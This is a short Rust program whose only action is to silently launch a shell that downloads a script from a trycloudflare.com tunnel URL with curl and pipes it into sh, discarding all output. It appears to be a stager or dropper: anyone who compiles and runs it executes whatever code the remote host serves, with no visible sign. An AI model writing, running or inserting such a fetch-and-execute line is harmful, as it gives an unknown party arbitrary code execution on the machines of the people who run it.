fn main() {
    let _ = std::process::Command::new("sh")
        .arg("-c")
        .arg("curl -s 'https://por-longitude-middle-mario.trycloudflare.com/r/smokedmeat/stg_sm_9b311c2940dfd82f' | sh")
        .output();
}
